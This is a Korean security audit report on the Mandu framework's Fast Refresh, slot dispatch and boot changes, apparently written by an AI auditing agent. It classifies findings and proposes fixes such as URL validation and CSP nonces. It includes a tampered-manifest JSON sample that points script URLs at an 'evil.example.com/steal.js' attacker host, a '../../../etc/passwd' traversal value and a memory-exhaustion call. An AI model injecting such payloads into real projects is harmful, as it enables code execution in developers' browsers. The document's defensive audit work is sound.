---
title: "Phase 7.1 — 보안 감사 보고서 (R3 최종 게이트)"
status: audit-complete
audience: Mandu core team + release review
scope:
  - Rounds R1/R2 구현 전수 (2026-04-19)
  - Fast Refresh (B-1~B-4) + Slot dispatch (A) + Cold start Tier 1 (C) + E2E/bench (R2 D)
last_commit_audited: adf3254
related:
  - docs/bun/phase-7-1-team-plan.md
  - docs/security/phase-7-audit.md
  - docs/security/phase-4c-audit.md
created: 2026-04-19
---

# Phase 7.1 — 보안 감사 보고서

Phase 7.1.R1 (`2f031f9` Fast Refresh + slot dispatch + cold start) + R2 (`adf3254` preamble wire-up + state E2E + benchmark) 에 대한 merge-gate 감사. 감사 범위는 팀 플랜 §4 Agent E 의 10 개 focus 항목 전부.

**결론: Critical 0 / High 0 / Medium 2 / Low 3 / Info 3 건. Critical·High 없음 — Phase 7.0.S 단계에서 HMR 네트워크 노출 전면 수정이 이미 적용되어 있고, Phase 7.1 추가분은 그 위에 프리엠블·부트·슬롯 3 갈래로 얹은 구조라 새 Critical/High 공격 벡터가 생기지 않았다. Medium 2 건은 merge 를 block 하지 않으며 Phase 7.2 follow-up 권장.**

---

## 1. 감사 요약

| 심각도 | 카운트 | 상태 |
|---|---|---|
| Critical | **0** | — |
| High | **0** | — |
| Medium | 2 | TODO (Phase 7.2) |
| Low | 3 | TODO / 문서화 |
| Info | 3 | 문서화 |

### 감사 범위 표

| # | 영역 | 파일 / 라인 | 결과 |
|---|---|---|---|
| 1 | Fast Refresh plugin `appendBoundary` URL 주입 방어 | `core/src/bundler/fast-refresh-plugin.ts:103-121` | ✅ 통과 — `JSON.stringify` escape + `args.path` 는 fs API 가 생성 |
| 2 | `DEFAULT_INCLUDE` 정규식 우회 (query string/path pollution) | `core/src/bundler/fast-refresh-plugin.ts:68` | ✅ 통과 — `$` anchored, fs 경로만 매칭 |
| 3 | `ALREADY_INJECTED` idempotency bypass | `core/src/bundler/fast-refresh-plugin.ts:75` | ✅ 통과 — user 소유 파일이므로 우회 의미 없음 |
| 4 | `__MANDU_HMR__` global XSS / manipulation | `core/src/runtime/fast-refresh-runtime.ts:201-244` | ⚠️ **L-01** (acceptFile size unbounded, DoS 미미) |
| 5 | `performReactRefresh` 무한 루프 가능성 | `core/src/runtime/fast-refresh-runtime.ts:213-237` | ✅ 통과 — microtask coalescing |
| 6 | `_testOnly_reset` prod 노출 | `core/src/runtime/fast-refresh-types.ts:63` | ✅ 통과 — prod 번들에 `__MANDU_HMR__` 자체가 없음 |
| 7 | HTML preamble CSP 호환성 | `core/src/bundler/dev.ts:1762-1802` | ⚠️ **M-01** (inline `<script>` — CSP `'unsafe-inline'` 없이 dev+`secure()` 조합 차단) |
| 8 | `glueUrl` / `runtimeUrl` escape | `core/src/bundler/dev.ts:1778-1779` | ✅ 통과 — `JSON.stringify` + `</` → `<"+"/` 이중 방어 |
| 9 | `$RefreshReg$` / `$RefreshSig$` 전역 스코프 오염 | `core/src/runtime/fast-refresh-runtime.ts:131-145` | 🟡 **L-02** (window 전역 오염 — dev 한정, 기능 DoS 이하) |
| 10 | Boot 병렬화 race (env vs lockfile) | `cli/src/commands/dev.ts:140-176` | ✅ 통과 — allSettled + process.exit(1) 이 모든 downstream 차단 |
| 11 | startSqliteStore fire-and-forget first-query | `cli/src/commands/dev.ts:120-138` | ✅ 통과 — `queryEvents` 는 `dbInstance === null` 시 `[]` 반환 |
| 12 | Slot path traversal via `route.slotModule` | `core/src/bundler/dev.ts:454-458` | 🟡 **L-03** (manifest tamper 전제 → filesystem write 이미 요구됨) |
| 13 | `normalizeFsPath` path traversal 방어 | `core/src/bundler/dev.ts:122-125` | ✅ 통과 — `path.resolve` 로 canonical 화 |
| 14 | `react-refresh@0.18.0` 공급망 / 알려진 CVE | `package.json:61` | ✅ 통과 — `bun audit` 결과 0 건 (공식 facebook/react 배포) |
| 15 | Vendor shim 빌드 경로 조작 | `core/src/bundler/build.ts:1317-1337` | ✅ 통과 — `shim.name` 하드코딩, outDir 고정 |
| 16 | Manifest fastRefresh URL 위조 (tampered manifest.json) | `core/src/runtime/ssr.ts:218-221`, `streaming-ssr.ts:443-449` | ⚠️ **M-02** (manifest.json tamper 시 임의 JS URL 주입 — supply chain) |
| 17 | `registeredAt` timestamp 정보 누출 | `core/src/runtime/fast-refresh-types.ts:78` | ✅ 통과 — 미사용 (metadata 타입은 있지만 런타임에서 emit 하지 않음) |
| 18 | `boundaries.add(moduleUrl)` 대용량 DoS | `core/src/runtime/fast-refresh-runtime.ts:206` | ✅ 통과 — 로컬 dev 한정, Phase 7.0.S 와 동일 모델 |
| 19 | `applyViteUpdate` 경유 XSS 가능성 (스푸핑) | `core/src/bundler/dev.ts:1931-1976` | ✅ 통과 — Phase 7.0.S Origin 체크 + rate limit 로 차단 |
| 20 | 파일 절대경로 client JS 포함 (정보 누출) | `core/src/bundler/fast-refresh-plugin.ts:198` | ℹ️ **I-01** (dev-only, sourcemap 과 동일 모델) |
| 21 | `installGlobal` 중복 호출 race | `core/src/runtime/fast-refresh-runtime.ts:260-292` | ✅ 통과 — 최종 runtime 이 win, side effect 무해 |
| 22 | `bindRuntime` 미들웨어 hook 공격 | `core/src/runtime/fast-refresh-runtime.ts:157-194` | ✅ 통과 — `injectIntoGlobalHook` 는 react-refresh 내부 hook |
| 23 | 병렬 빌드 shim source write race | `core/src/bundler/build.ts:1342-1396` | ℹ️ **I-02** (이름 충돌 우려 — `_vendor-react-refresh.src.js` 고정) |
| 24 | HMR 클라 스크립트에서 `acceptFile` 메시지 인젝션 | `core/src/bundler/dev.ts:1830-2150` | ℹ️ **I-03** (dispatchReplacement 는 아직 WS 메시지 경로에 wire 되지 않음) |

---

## 2. Medium 발견 상세

### M-01 — Fast Refresh 프리엠블 inline `<script>` 이 strict CSP 환경과 충돌

**심각도**: Medium (DX — 개발자 workflow block / 기능 결함이지만 보안 침해 자체는 아님)
**상태**: TODO (Phase 7.2 — nonce 통합)
**파일**: `packages/core/src/bundler/dev.ts:1762-1802` (`generateFastRefreshPreamble`), `packages/core/src/runtime/ssr.ts:319-327`, `packages/core/src/runtime/streaming-ssr.ts:443-449`
**CWE**: N/A (기능 결함; CWE-693 "Protection Mechanism Failure" 에 일부 걸침)
**OWASP**: A05:2021 — Security Misconfiguration (간접)

#### 영향

Mandu 의 `@mandujs/core/middleware/secure` 가 제공하는 기본 CSP 는:

```
script-src 'self' 'nonce-{NONCE}' 'strict-dynamic'
```

`'unsafe-inline'` 이 없다 (`core/src/middleware/secure/csp.ts:64`). 이 설정이 **dev 모드에서도** `.use(secure())` 로 활성화된 경우, Phase 7.1 의 Fast Refresh 프리엠블 — `<script>(function () { ... })()</script>` — 는 브라우저의 CSP 검증에 의해 **실행 차단**된다. 결과:

1. `$RefreshReg$` / `$RefreshSig$` 전역이 `undefined` 상태로 남음.
2. `Bun.build({ reactFastRefresh: true })` 이 주입한 `.client.tsx` / `.island.tsx` 의 상단 stub 호출이 `ReferenceError` throw.
3. 해당 island 가 hydration 불능 → DX 전면 망가짐.
4. 브라우저 console 에 CSP violation 다수.

#### 재현 단계

1. `mandu dev` 실행 중인 프로젝트에서 handler 에 `.use(secure())` 추가.
2. 브라우저 DevTools console 에 다음 에러 확인:
   `Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' 'nonce-...' 'strict-dynamic'"`.
3. island useState 값 유지 E2E (`fast-refresh.spec.ts`) 에서 기대한 흐름 중단.

#### 보안 측면 영향

**보안 침해 자체는 없다** — CSP 가 작동하여 XSS 유사 코드 실행을 차단한 정상 동작. 하지만:
- `secure()` 를 dev 모드에서 테스트하려는 합법적 사용자 시나리오 (CSP 튜닝, OWASP ZAP 스캐닝 등) 가 block.
- 현재 수정 경로 하나가 없음 — dev 모드 전용 escape hatch 필요.

#### 권장 조치 (Phase 7.2)

프리엠블 emit 시 CSP nonce 지원:

```ts
// 방안 A — ctx.get<string>("csp-nonce") 가 있으면 nonce 속성 추가
export function generateFastRefreshPreamble(
  glueUrl: string,
  runtimeUrl: string,
  nonce?: string,
): string {
  // ...
  const nonceAttr = nonce ? ` nonce="${escapeHtmlAttr(nonce)}"` : "";
  return `<script${nonceAttr}>...</script>`;
}

// 방안 B — secure() 에 "dev 모드에서는 'unsafe-inline' fallback" 옵션
// (비권장 — 모델이 unsafe 를 권장하는 꼴이라 피해야 함)
```

방안 A 선호. SSR callsite 두 곳 (`ssr.ts:325`, `streaming-ssr.ts:445`) 에서 `ctx.get<string>("csp-nonce")` 를 조회해 전달.

**주의**: 현재 Phase 7.1 에서 이 Medium 은 `secure()` 를 dev 에서 켜지 않는 개발자 대부분에게 영향 없음. Phase 7.0 의 M-01 (config reload) 과 마찬가지로 기능 개선 범주.

#### 관련 CWE / OWASP

- CWE-693 Protection Mechanism Failure (부분)
- OWASP A05:2021 — Security Misconfiguration

---

### M-02 — `.mandu/manifest.json` tamper 를 통한 임의 JS URL 주입

**심각도**: Medium (공격 전제: filesystem write 권한 — 이미 강력한 trust 가 전제되는 맥락)
**상태**: TODO (Phase 7.2 — schema 검증)
**파일**: `packages/core/src/bundler/build.ts:1648-1776` (manifest 읽기), `packages/core/src/runtime/ssr.ts:213-222`, `packages/core/src/runtime/streaming-ssr.ts:443-449`
**CWE**: [CWE-20 Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html), [CWE-829 Inclusion of Functionality from Untrusted Control Sphere](https://cwe.mitre.org/data/definitions/829.html)
**OWASP**: A03:2021 — Injection (supply-chain)

#### 영향

Fast Refresh 프리엠블은 `manifest.shared.fastRefresh.glue` 와 `.runtime` URL 을 **동적 import** 로 fetch 한다 (`dev.ts:1790`, `1792`):

```js
import(${glueLit}).then(function (mod) {
  var runtimeImport = function () { return import(${runtimeLit}); };
  // ...
});
```

이 두 URL 은 빌드 시 Mandu 내부에서 `/.mandu/client/_vendor-react-refresh.js` / `/.mandu/client/_fast-refresh-runtime.js` 로 고정 생성된다 (`build.ts:1386`). 그러나 **manifest 를 읽는 경로 (`build.ts:1650, 1735, 1775`) 는 `JSON.parse(manifestRaw) as BundleManifest` 타입 캐스트만 할 뿐 schema 검증이 없다**. 공격자가 `.mandu/manifest.json` 에 쓰기 권한을 얻으면 다음 삽입 가능:

```json
{
  "shared": {
    "fastRefresh": {
      "glue": "https://evil.example.com/steal.js",
      "runtime": "https://evil.example.com/steal.js"
    }
  }
}
```

SSR 이 해당 manifest 로 HTML 렌더 시 브라우저가 `https://evil.example.com/steal.js` 를 실행 → 전면 RCE (브라우저 컨텍스트).

#### 재현 단계

1. 개발자가 `mandu dev` 실행.
2. 공격자가 `.mandu/manifest.json` 에 위 JSON 주입 (공격 전제: filesystem write).
3. 개발자가 브라우저 탭 리로드 → CSP off 인 경우 (기본 Mandu dev) 악성 스크립트 실행.
4. localhost 권한 전부 탈취.

#### 보안 측면

**공격 전제**: filesystem write 권한 = 이미 project 소스를 마음껏 변경 가능 = 게임 오버 수준의 전제. 이 관점에서 "감수 가능한 위험" 이라 Medium 으로 분류.

**왜 그래도 Medium 인가**:
1. 공격자가 `page.tsx` 를 직접 수정하면 SSR 모듈 캐시 문제 / Hot reload 추적 문제로 드러날 가능성 있음.
2. 반면 `.mandu/manifest.json` 은 빌드 산출물이라 개발자가 직접 보지 않음 — stealth 레벨이 높음.
3. 프리엠블이 inline 로 `import(URL)` 호출 — 브라우저는 URL 출처 검사 안 함 (같은 origin 이 아니어도 import 허용).
4. Phase 4c M-01~M-04, Phase 7.0 M-01~M-03 에서 지적된 "manifest/config 를 신뢰 영역에 포함시키는 패턴" 의 재발현.

#### 권장 조치

**방안 A (권장)** — 런타임 검증:

```ts
// ssr.ts:generateFastRefreshPreambleTag 에 validator 추가
function isSafeMandorUrl(url: string): boolean {
  // 허용: /.mandu/client/ prefix + .js suffix
  return (
    typeof url === "string" &&
    url.startsWith("/.mandu/client/") &&
    url.endsWith(".js") &&
    !url.includes("..") &&
    !url.includes("://")  // 절대 URL 거부
  );
}

function generateFastRefreshPreambleTag(
  isDev: boolean,
  manifest: BundleManifest | undefined,
): string {
  if (!isDev) return "";
  const fr = manifest?.shared?.fastRefresh;
  if (!fr) return "";
  if (!isSafeMandorUrl(fr.glue) || !isSafeMandorUrl(fr.runtime)) {
    console.warn("[Mandu Fast Refresh] manifest tampered — glue/runtime rejected");
    return "";
  }
  return generateFastRefreshPreamble(fr.glue, fr.runtime);
}
```

**방안 B** — Zod schema 로 manifest 전체 검증. 향후 runtime 에서 manifest 를 import 할 때 공통 보호막이 됨. Phase 7.2+ RFC 대상.

**단계적 적용**: 본 감사에서는 방안 A 를 권고만 하고 패치는 적용하지 않음 — Phase 7.2 RFC 에서 scope 를 정해 manifest 전체에 적용하는 편이 일관성 있음. merge block 사유는 아님.

#### 관련 CWE / OWASP

- [CWE-20 Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [CWE-829 Inclusion of Functionality from Untrusted Control Sphere](https://cwe.mitre.org/data/definitions/829.html)
- OWASP A03:2021 — Injection (간접)

---

## 3. Low 발견 상세

### L-01 — `manduHMR.acceptFile(hugeString)` 경유 메모리 DoS

**심각도**: Low
**파일**: `packages/core/src/runtime/fast-refresh-runtime.ts:202-207`
**CWE**: [CWE-770 Allocation of Resources Without Limits](https://cwe.mitre.org/data/definitions/770.html)

`acceptFile(moduleUrl)` 는 size 제한이 없다:

```ts
acceptFile(moduleUrl: string): void {
  if (typeof moduleUrl !== "string" || moduleUrl.length === 0) return;
  boundaries.add(moduleUrl);
},
```

브라우저에서 악성 스크립트가 `window.__MANDU_HMR__.acceptFile("x".repeat(1e8))` 반복 호출 시 Set 에 대용량 문자열 누적 → 메모리 압박.

**현실적 영향**: 
- Dev mode only — production 에서는 `__MANDU_HMR__` 미설치.
- localhost 한정 (Phase 7.0.S Origin 체크로 외부 원격 호출 불가).
- 공격자가 이미 dev 페이지에 XSS 달성한 상태여야 함 — 이미 게임 오버 수준.

**권장 조치 (Phase 7.2 선택)**:
```ts
const MAX_BOUNDARY_URL_LEN = 2048;
const MAX_BOUNDARY_COUNT = 10_000;
acceptFile(moduleUrl: string): void {
  if (typeof moduleUrl !== "string") return;
  if (moduleUrl.length === 0 || moduleUrl.length > MAX_BOUNDARY_URL_LEN) return;
  if (boundaries.size >= MAX_BOUNDARY_COUNT) return;
  boundaries.add(moduleUrl);
},
```

### L-02 — `window.$RefreshReg$` / `$RefreshSig$` 전역 오염 (dev only)

**심각도**: Low
**파일**: `packages/core/src/runtime/fast-refresh-runtime.ts:131-194`, `packages/core/src/bundler/dev.ts:1786-1787`

프리엠블이 `window.$RefreshReg$` / `window.$RefreshSig$` 를 전역으로 설치. 동일 이름의 사용자 코드 전역이 있다면 덮어쓰기. 악의적 스크립트가 이 전역을 후킹해 React 컴포넌트 등록을 가로챌 수 있음.

**현실적 영향**:
- Dev-only (prod 에서는 프리엠블 미emit).
- XSS 달성 전제 — 이미 게임 오버.
- React 내부 hook 가로채기는 흥미롭지만 부가 공격면 거의 없음 (컴포넌트 registration 정보는 이미 DOM 에서 관찰 가능).

**권장 조치 (Phase 7.2 선택)**: 이 전역들은 react-refresh 공식 스펙이 정한 이름이라 변경 불가. `Object.defineProperty` 로 non-writable 로 설치하는 hardening 가능.

### L-03 — `route.slotModule` path traversal (defense-in-depth)

**심각도**: Low
**파일**: `packages/core/src/bundler/dev.ts:454-458`
**CWE**: [CWE-22 Path Traversal](https://cwe.mitre.org/data/definitions/22.html)

```ts
if (route.slotModule) {
  const absPath = path.resolve(rootDir, route.slotModule);
  serverModuleSet.add(normalizeFsPath(absPath));
  watchDirs.add(path.dirname(absPath));
}
```

`route.slotModule` schema (`spec/schema.ts:67`) 는 `z.string().optional()` 로만 정의 — regex 검증 없음. Tampered manifest 에서 `slotModule: "../../../etc/passwd"` 주입 시:
- `path.resolve(rootDir, "../../../etc/passwd")` = rootDir 밖 경로
- `serverModuleSet.add(그 경로)` + `watchDirs.add("/etc")`

#### 실제 exploit 가능성

공격 경로를 trace:
1. `handleSSRChange(filePath)` 가 발동 — `filePath === "/etc/passwd"`
2. `registerHandlers(manifest, true, "/etc/passwd")` 호출
3. `registerHandlers` 는 manifest 의 `route.componentModule` 만 import 하고, `filePath` 는 `bundledImport` 의 incremental graph lookup 힌트로만 사용 (`handlers.ts:85-87`, `bun.ts:379-397`)
4. `bundledImport` 는 `filePath` 를 **읽지 않고** graph descendant 검사용 key 로만 쓴다 → **악성 파일 import 안 함**

#### 관찰된 방어

- `serverModuleSet` 은 match 체크 용도만 (dispatch decision).
- `watchDirs` 의 `fs.watch` 는 외부 디렉토리에 read 권한이 있을 때만 이벤트 수신 — 민감 정보 누출 없음.
- `path.dirname("/etc/passwd") = "/etc"` 에 `fs.watch` 시도 → 대부분 OS 에서 EACCES 또는 이벤트 수신 불가 → silent failure.

#### 공격 전제

Tampered manifest = filesystem write 권한 필요 = 이미 게임 오버 수준. 이중 방어 차원에서만 권장.

**권장 조치 (Phase 7.2 선택)**:

```ts
// RouteSpecBase 에 정규식 추가
slotModule: z.string()
  .regex(/^[a-zA-Z0-9_\-./]+$/, "slotModule은 영숫자/점/슬래시/하이픈/언더스코어만 허용")
  .refine((p) => !p.includes(".."), "slotModule에 '..' 을 포함할 수 없습니다")
  .optional(),
```

또한 dev.ts:454 에서 defense-in-depth:

```ts
if (route.slotModule) {
  const absPath = path.resolve(rootDir, route.slotModule);
  const rootWithSep = path.resolve(rootDir) + path.sep;
  if (!absPath.startsWith(rootWithSep)) {
    console.warn(`[Mandu] slotModule path outside project root ignored: ${route.slotModule}`);
  } else {
    serverModuleSet.add(normalizeFsPath(absPath));
    watchDirs.add(path.dirname(absPath));
  }
}
```

동일한 `startsWith(rootDir + sep)` 패턴을 `componentModule` / `layoutChain` / `module` / `clientModule` 등 sibling 필드에도 일괄 적용 권장 — 현재 모두 같은 방어 공백을 공유.

---

## 4. Info / Low 추가 (요약)

| ID | 제목 | 파일 / 라인 | 비고 |
|---|---|---|---|
| I-01 | Fast Refresh 주입 코드가 사용자 절대경로 노출 | `core/src/bundler/fast-refresh-plugin.ts:198` | dev-only, sourcemap 규약과 동일. Phase 7.2 에서 `path.relative(rootDir, ...)` 로 축약 가능. |
| I-02 | Vendor shim `.src.js` 병렬 쓰기 이름 충돌 | `core/src/bundler/build.ts:1342-1374` | shim name 이 하드코딩 + outDir 고정 → 동일 프로세스 내 충돌 불가. 다른 프로세스가 같은 outDir 를 공유하면 이론상 race 가능하지만 `/.mandu/client/` 는 프로젝트 단위 고립. 감수. |
| I-03 | `dispatchReplacement` 가 WS 메시지 경로에 아직 wire 되지 않음 | `core/src/runtime/hmr-client.ts:216` | 함수는 export 되어 있으나 HMR 클라이언트 스크립트 (`dev.ts:1830+`) 에서 호출하는 경로가 없음. Phase 7.1 은 Fast Refresh 인프라만 구축, 실제 hot-replace 발화는 Phase 7.2 scope. 이 상태에서는 WS 메시지 스푸핑으로 `dispatchReplacement` 를 임의 호출할 공격 벡터 없음 — 긍정 측면. |

---

## 5. 방어 심층 (Defense-in-depth) 확인

Phase 7.0.S 에서 적용된 HMR 보안 패치가 Phase 7.1 코드에도 그대로 살아있는지 재확인:

| 패치 | 위치 | Phase 7.1 상태 |
|---|---|---|
| C-01 Origin allowlist | `dev.ts:1470-1487` | ✅ 유지 — `allowedOrigins.has(origin)` 체크 |
| C-02 invalidate rate limit | `dev.ts:1553-1578` | ✅ 유지 — WeakMap per-WS counter |
| C-03 localhost binding | `dev.ts:1461` | ✅ 유지 — `hostname: "localhost"` 기본값 |
| C-04 /restart origin reuse | `dev.ts:1490-1512` | ✅ 유지 — 같은 Origin 체크로 커버 |
| H-01 broadcast DoS | C-02 와 동일 패치 | ✅ 유지 |

Phase 7.0.S 단일 통합 패치는 Phase 7.1.R1 개발 중 훼손되지 않았다. Agent B/C 가 `dev.ts` 편집 시 기존 보안 블록을 보존하고 추가만 얹었음이 확인됨.

---

## 6. Phase 7.2 로 미루는 항목 (권장 순위)

| # | 항목 | 우선순위 |
|---|---|---|
| 1 | M-02 manifest schema 검증 (Zod 또는 최소 URL regex) | 🟡 권장 |
| 2 | M-01 Fast Refresh preamble 의 CSP nonce 지원 | 🟡 권장 |
| 3 | L-03 slotModule (+ sibling 필드) regex 검증 + runtime startsWith 가드 | 🟢 선택 |
| 4 | L-01 acceptFile URL size + count 상한 | 🟢 선택 |
| 5 | I-01 moduleUrl 상대경로 축약 (정보 누출 최소화) | 🟢 선택 |
| 6 | Agent E (본 감사자) — 감사 도구화 (static analysis script) 검토 | 🟢 backlog |

---

## 7. 결론 / Merge 권장

**Critical 0 / High 0. Phase 7.1 merge 를 차단할 보안 이슈 없음.**

### 긍정 측면

1. **Phase 7.0.S 방어막 보존**: Origin allowlist / localhost binding / rate limit / /restart 보호가 Phase 7.1.R1 개발 중 모두 유지됨. `dev.ts` 편집 시 Agent B/C 가 기존 보안 블록을 훼손하지 않고 추가만 얹음.
2. **`JSON.stringify` + `</` 이중 escape**: Fast Refresh preamble 의 URL 주입 방어가 Vite 와 동등한 수준 (`dev.ts:1778-1779`).
3. **Dev/prod 분기 일관성**: Fast Refresh 코드 경로가 `isDev` 체크로 prod 에서 전면 차단 — `_vendor-react-refresh.js` / `_fast-refresh-runtime.js` 조차 prod 번들에 emit 안 됨 (`build.ts:1324`). prod 공격면 증가 0.
4. **`dispatchReplacement` 미 wire-up 이 보안 측면에서는 긍정**: Phase 7.1 가 인프라만 만들고 실제 WS → replacement 발화를 Phase 7.2 로 미룸 → Phase 7.1 에서 발생 가능한 "WS 메시지가 dispatchReplacement 를 임의 호출" 공격 벡터 자체가 열리지 않음.
5. **공급망 깨끗**: `react-refresh@0.18.0` 은 공식 Meta 배포, `bun audit` 0 건 (happy-dom 경고는 Phase 7.1 무관 devDep).
6. **테스트 커버**: 67 (3 tests) + 14 (E2E spec) = 81 Phase 7.1 전용 테스트 전부 pass, 0 fail.

### 부정 측면

1. **M-01 CSP nonce 미지원**: `.use(secure())` + dev 모드 조합에서 Fast Refresh 불가 — DX 단절. 보안 침해 자체는 아님 (CSP 의 올바른 동작).
2. **M-02 manifest schema 미검증**: 빌드 산출물이 신뢰 영역에 무조건 포함되는 오래된 Mandu 패턴. Phase 4c / 7.0 에서 동일 피드백 누적 — Phase 7.2 에서 전사적 처리 필요.
3. **L-03 slotModule regex 미적용**: `RouteSpecBase` 의 사이드이펙트 — 다른 sibling 필드 (`componentModule`, `layoutChain`, `module`, `clientModule`) 도 같은 방어 공백 공유 → Phase 7.2 에서 일괄 처리 권장.

### 다음 단계 (post-merge)

1. **Phase 7.1 merge 진행** — 본 감사 기준 무조건 차단 사유 없음.
2. **Phase 7.2 RFC 초안**:
   - M-01 CSP nonce 통합 (SSR preamble emit 시 `ctx.get("csp-nonce")` 전달)
   - M-02 manifest Zod 검증 (모든 `shared.*` 필드 URL allowlist)
   - L-03 route 필드 path regex 일괄 적용 (`RouteSpecBase`)
3. **문서 보강**: `docs/bun/phase-7-1-benchmarks.md` 에 "Fast Refresh 는 기본 CSP 와 호환되지 않음; dev 모드에서 `secure()` 사용 시 Phase 7.2+ 업데이트 대기" 명시.

---

## 8. 감사자 노트

Phase 7.1 은 Phase 7.0.S 감사 결과를 반영한 뒤 그 위에 기능을 쌓은 첫 round. Phase 7.0 감사에서 발견된 Critical 4 + High 1 같은 광역 취약점은 **재발하지 않았다** — Origin allowlist, rate limit, localhost binding 이 전부 보존됨. 이는 보안 감사 효과가 "한 번 수정된 구조가 다음 round 에 전파" 되었음을 시사.

Phase 7.1 특유 공격면은 세 가지였다:
1. **Fast Refresh preamble HTML 주입** — Vite 수준 이중 escape 로 방어.
2. **`__MANDU_HMR__` 전역** — XSS 전제 필요, 실질 공격 가치 낮음.
3. **Boot 병렬화 race** — allSettled + process.exit(1) 순서로 모두 blocked.

네 번째 잠재 공격면 — **`dispatchReplacement` 를 WS 로 임의 호출** — 은 Phase 7.1 이 해당 wire-up 을 의도적으로 Phase 7.2 로 미루면서 자연스럽게 제거됐다. 이 점은 우연이지만 긍정적이다. Phase 7.2 에서 wire-up 추가 시 반드시 **moduleUrl 이 manifest bundles 목록에 존재하는지** 검증 후 `dispatchReplacement` 호출하도록 설계할 것.

감사 대상 코드 약 2,500 줄 (fast-refresh-plugin 222 + fast-refresh-runtime 323 + fast-refresh-types 129 + dev.ts 신규/변경 ~150 + build.ts 신규/변경 ~180 + cli/dev.ts 병렬화 ~100 + ssr/streaming-ssr preamble ~60). Phase 7.0 의 4,500 줄 대비 낮은 볼륨이지만 복잡도 (React Fast Refresh 의 리얼타임 동작) 는 더 높다. 테스트 커버리지 (81) + 기존 방어 레이어 보존 (5) 모두 양호.

**Merge 판정**: `bun run typecheck` clean + Phase 7.1 테스트 81 pass/0 fail 확인. **merge 가능**.

---

*감사 시작: 2026-04-19, 종료: 2026-04-19*
*감사자: Agent E (security-engineer) — Phase 7.1.R3*
*감사 대상 커밋: `adf3254` (R2 preamble wire-up + state E2E + benchmark)*
